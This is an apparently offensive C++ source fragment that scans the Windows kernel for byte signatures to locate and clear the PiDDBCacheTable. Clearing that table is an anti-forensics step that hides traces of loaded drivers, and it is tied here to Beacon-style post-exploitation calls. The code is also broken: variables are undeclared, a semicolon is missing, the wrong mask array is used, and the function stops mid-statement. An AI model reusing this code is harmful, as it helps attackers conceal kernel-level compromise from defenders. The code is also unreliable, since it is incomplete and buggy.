#include <ddbcache.hpp>

struct _ddb_signature {
	char *section
	char *signature;
	char *mask;
	int offset;
};

// TODO: allow the user to add their own definitions + provide optional old definitions
__attribute__((used, section(".rdata"))) _ddb_signature lock_sigs[4] = {
	{
		.section = "PAGE",
		.signature = "\x8b\xd8\x85\xc0\x0f\x88\x00\x00\x00\x00\x65\x48\x8b\x04\x25\x00\x00\x00\x00\x66\xff\x88\x00\x00\x00\x00\xb2\x01\x48\x8d\x0d\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x4c\x8b\x00\x24",
		.mask = "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x",
		.offset = 28
	},
	{
		.section = "PAGE",
		.signature = "\x48\x8b\x0d\x00\x00\x00\x00\x48\x85\xc9\x0f\x85\x00\x00\x00\x00\x48\x8d\x0d\x00\x00\x00\x00\xe8\x00\x00\x00\x00\xe8",
		.mask = "xxx????xxxxx????xxx????x????x",
		.offset = 16
	},
	{
		.section = "PAGE",
		.signature = "\x8b\xd8\x85\xc0\x0f\x88\x00\x00\x00\x00\x65\x48\x8b\x04\x25\x00\x00\x00\x00\x48\x8d\x0d\x00\x00\x00\x00\xb2\x01\x66\xff\x88\x00\x00\x00\x00\x90\xe8\x00\x00\x00\x00\x4c\x8b\x00\x24",
		.mask = "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x",
		.offset = 19
	},
	{
		.section = nullptr,
		.signature = nullptr,
		.mask = nullptr,
		.offset = 0
	},
};

__attribute__((used, section(".rdata"))) _ddb_signature cache_sigs[3] = {
	{
		.section = "PAGE",
		.signature = "\x66\x03\xD2\x48\x8D\x0D",
		.mask = "xxxxxx",
		.offset = 0
	},
	{
		.section = "PAGE",
		.signature = "\x48\x8B\xF9\x33\xC0\x48\x8D\x0D",
		.mask = "xxxxxxxx",
		.offset = 2
	},
	{
		.section = nullptr,
		.signature = nullptr,
		.mask = nullptr,
		.offset = 0
	},
};


// TODO: maybe create an array of signatures/masks to search across different versions
BOOL ClearPiDDBCacheTable(HANDLE handle) {

	// NOTE: this is probably really dumb
	for (int i = 0; lock_sigs[i].signature; i++) {
		ddb_lock_ptr = Beacon$SignatureScanSection(handle, lock_sigs[i].section, ntoskrnl, lock_sigs[i].signature, lock_sigs[i].mask);

		if (ddb_lock_ptr) {
			ddb_lock_ptr += lock_sigs[i].offset;
			break;
		}
	}

	if (!ddb_lock_ptr) {
		// ERROR: could not locate DDBCache lock 
		return false;
	}

	for (int i = 0; cache_sigs[i].signature; i++) {
		ddb_cache_ptr = Beacon$SignatureScanSection(handle, cache_sigs[i].section, ntoskrnl, cache_sigs[i].signature, lock_sigs[i].mask);

		if (ddb_cache_ptr) {
			ddb_cache_ptr += cache_sigs[i].offset;
			break;
		}
	}

	if (!ddb_cache_ptr) {
		// ERROR: could not locate DDBCache table 
		return false;
	}

	void *ddb_lock = 
}
